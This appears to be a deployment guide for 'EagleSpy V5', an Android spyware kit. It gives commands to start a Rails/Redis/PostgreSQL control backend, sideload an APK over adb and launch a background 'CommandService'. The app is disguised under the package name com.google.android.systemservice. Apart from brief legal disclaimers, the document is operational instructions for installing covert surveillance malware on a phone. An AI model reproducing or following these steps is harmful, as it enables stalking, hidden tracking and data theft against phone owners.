# 🚀 EAGLESPY V5 - DEPLOYMENT GUIDE (SECURED)

## 📊 PROJECT STATUS: **READY FOR DEPLOYMENT**

### ✅ SECURITY HARDENING COMPLETED
- **Infrastructure**: Docker socket removed, Redis password enabled.
- **Application**: SQL Injection & Path Traversal fixed.
- **Credentials**: All default passwords replaced with `.env` variables.
- **Dashboard**: Modern "Command Center" UI deployed.

---

## 🎯 DEPLOYMENT STEPS

### 1️⃣ Security Pre-requisites (MANDATORY)
Before starting containers, you MUST verify your security configuration:

1. **Check `.env` file**: Ensure all passwords are set and NOT using defaults.
   ```bash
   grep "CHANGE_ME" .env
   # Should return nothing
   ```

2. **Generate Secrets** (if you haven't yet):
   ```bash
   ruby -rsecurerandom -e "puts SecureRandom.hex(64)" # For SECRET_KEY_BASE
   openssl rand -base64 24 # For Database/Redis passwords
   ```

3. **Verify Docker Config**:
   ```bash
   grep "docker.sock" docker/docker-compose.yml
   # Should NOT return any active mount lines
   ```

### 2️⃣ Start Backend
```bash
cd docker
docker-compose up -d --build
```

Verify services:
```bash
docker-compose ps
# All services should be "Up"
# redis should allow connections only with password
```

### 3️⃣ Deploy Android APK

**Connect device via USB:**
```bash
adb devices
```

**Install APK:**
```bash
adb install -r android-client/app/build/outputs/apk/debug/app-debug.apk
```

**Start CommandService:**
```bash
adb shell am start-foreground-service com.google.android.systemservice/.services.CommandService
```

---

## 🛡️ SECURITY CONFIGURATION

### Redis Authentication
Redis now requires a password. If you need to connect manually:
```bash
docker exec -it redis redis-cli -a $REDIS_PASSWORD
```

### Database Access
PostgreSQL is protected. Access it via:
```bash
docker exec -it db psql -U postgres -d android_spyware_production
```

### Dashboard Access
- URL: **http://localhost/admin**
- Default User: `admin@example.com` (Change immediately!)
- Default Password: See `ADMIN_PASSWORD` in your `.env` file.

---

## 🧪 VERIFICATION CHECKLIST

- [ ] **Login**: Can log in to Admin UI with new credentials?
- [ ] **Redis**: `docker logs redis` shows "Ready to accept connections"?
- [ ] **ActionCable**: Websocket connection established (check browser console)?
- [ ] **File Upload**: Uploading a file outside allowed directories fails?
- [ ] **SQLi**: `GET /api/location` handles invalid inputs gracefully?

---

## 📋 MONITORING & DEBUGGING

### Rails Application Logs
```bash
docker-compose -f docker/docker-compose.yml logs -f rails-app
```

### Redis Activity (Authenticated)
```bash
docker exec redis redis-cli -a $REDIS_PASSWORD MONITOR
```

### Android Device Logs
```bash
adb logcat -s SystemCore:* *:E
```

---

## ⚠️ PRODUCTION WARNING
This system is powerful. To avoid legal issues:
1. **Never** deploy on public internet without SSL/TLS (Nginx/Traefik).
2. **Never** monitor devices you do not own.
3. **Always** secure your `.env` file (chmod 600).

---

## 📞 SUPPORT
**Author:** Costin Canciu  
**Repo:** https://github.com/CanciuCostin/android-spyware
**License:** MIT

